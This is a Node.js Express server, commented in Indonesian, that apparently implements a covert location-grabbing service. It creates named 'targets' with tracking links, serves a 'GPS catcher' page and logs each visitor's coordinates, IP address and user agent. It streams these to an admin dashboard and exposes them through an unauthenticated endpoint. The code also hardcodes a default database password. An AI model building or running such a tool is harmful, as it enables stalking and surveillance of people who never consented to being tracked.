const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Pool } = require('pg');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);

// Koneksi PostgreSQL: pakai DATABASE_URL jika ada (untuk deploy/Vercel/Neon),
// fallback ke config lokal
const pool = process.env.DATABASE_URL
  ? new Pool({
      connectionString: process.env.DATABASE_URL,
      ssl: { rejectUnauthorized: false }
    })
  : new Pool({
      user: process.env.PGUSER || 'postgres',
      host: process.env.PGHOST || 'localhost',
      database: process.env.PGDATABASE || 'tracking_db',
      password: process.env.PGPASSWORD || 'aqsa12345ty',
      port: process.env.PGPORT ? parseInt(process.env.PGPORT, 10) : 5433
    });

pool.query('SELECT NOW()')
  .then(() => console.log('Terhubung ke PostgreSQL'))
  .catch((err) => console.error('Gagal konek PostgreSQL:', err.message));

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
  console.log('Admin terhubung:', socket.id);
  socket.on('disconnect', () => {
    console.log('Admin terputus:', socket.id);
  });
});

// API Endpoint 1: Buat target baru
app.post('/api/targets', async (req, res) => {
  try {
    const { targetName } = req.body;

    if (!targetName || typeof targetName !== 'string' || targetName.trim() === '') {
      return res.status(400).json({ success: false, message: 'targetName wajib diisi' });
    }

    const cleanName = targetName.trim().substring(0, 255);
    const trackingCode = crypto.randomBytes(4).toString('hex');

    const result = await pool.query(
      'INSERT INTO targets (target_name, tracking_code) VALUES ($1, $2) RETURNING id, target_name, tracking_code, created_at',
      [cleanName, trackingCode]
    );

    const row = result.rows[0];
    const trackingUrl = `${req.protocol}://${req.get('host')}/t/${row.tracking_code}`;

    return res.status(201).json({
      success: true,
      data: {
        id: row.id,
        targetName: row.target_name,
        trackingCode: row.tracking_code,
        trackingUrl: trackingUrl,
        createdAt: row.created_at
      }
    });
  } catch (err) {
    console.error('POST /api/targets error:', err);
    if (err.code === '23505') {
      return res.status(409).json({ success: false, message: 'Kode tracking duplikat, coba lagi' });
    }
    return res.status(500).json({ success: false, message: 'Gagal membuat target' });
  }
});

// Routing Endpoint 2: Halaman penangkap GPS
app.get('/t/:code', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// API Endpoint 3: Terima lokasi
app.post('/api/submit-location', async (req, res) => {
  try {
    const { trackingCode, lat, lng, accuracy } = req.body;

    if (!trackingCode || lat === undefined || lng === undefined) {
      return res.status(400).json({ success: false, message: 'trackingCode, lat, lng wajib diisi' });
    }

    const latitude = parseFloat(lat);
    const longitude = parseFloat(lng);
    const accValue = accuracy !== undefined && accuracy !== null ? parseFloat(accuracy) : null;

    if (Number.isNaN(latitude) || Number.isNaN(longitude)) {
      return res.status(400).json({ success: false, message: 'lat/lng tidak valid' });
    }
    if (latitude < -90 || latitude > 90 || longitude < -180 || longitude > 180) {
      return res.status(400).json({ success: false, message: 'Koordinat di luar rentang' });
    }

    const targetResult = await pool.query(
      'SELECT id, target_name FROM targets WHERE tracking_code = $1 LIMIT 1',
      [String(trackingCode).trim()]
    );

    if (targetResult.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Tracking code tidak ditemukan' });
    }

    const target = targetResult.rows[0];
    const ipAddress = (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim() || req.ip || (req.socket && req.socket.remoteAddress) || null;
    const userAgent = req.headers['user-agent'] || null;

    await pool.query(
      'INSERT INTO location_logs (target_id, latitude, longitude, accuracy, user_agent, ip_address) VALUES ($1, $2, $3, $4, $5, $6)',
      [target.id, latitude, longitude, accValue, userAgent, ipAddress]
    );

    const payload = {
      targetName: target.target_name,
      lat: latitude,
      lng: longitude,
      accuracy: accValue,
      timestamp: new Date().toISOString()
    };

    io.emit('new-location', payload);

    return res.json({ success: true, message: 'Lokasi tersimpan' });
  } catch (err) {
    console.error('POST /api/submit-location error:', err);
    return res.status(500).json({ success: false, message: 'Gagal menyimpan lokasi' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API polling fallback untuk Vercel (Socket.io tidak persisten di serverless)
// GET /api/locations/latest?limit=20
app.get('/api/locations/latest', async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit, 10) || 20, 100);
    const result = await pool.query(
      'SELECT t.target_name AS "targetName", l.latitude AS lat, l.longitude AS lng, l.accuracy, l.created_at AS timestamp FROM location_logs l JOIN targets t ON t.id = l.target_id ORDER BY l.created_at DESC LIMIT $1',
      [limit]
    );
    const rows = result.rows.map((r) => ({
      targetName: r.targetName,
      lat: parseFloat(r.lat),
      lng: parseFloat(r.lng),
      accuracy: r.accuracy !== null ? parseFloat(r.accuracy) : null,
      timestamp: r.timestamp
    }));
    return res.json({ success: true, data: rows });
  } catch (err) {
    console.error('GET /api/locations/latest error:', err);
    return res.status(500).json({ success: false, message: 'Gagal ambil data' });
  }
});

if (!process.env.VERCEL) {
  server.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
  });
}

module.exports = app;
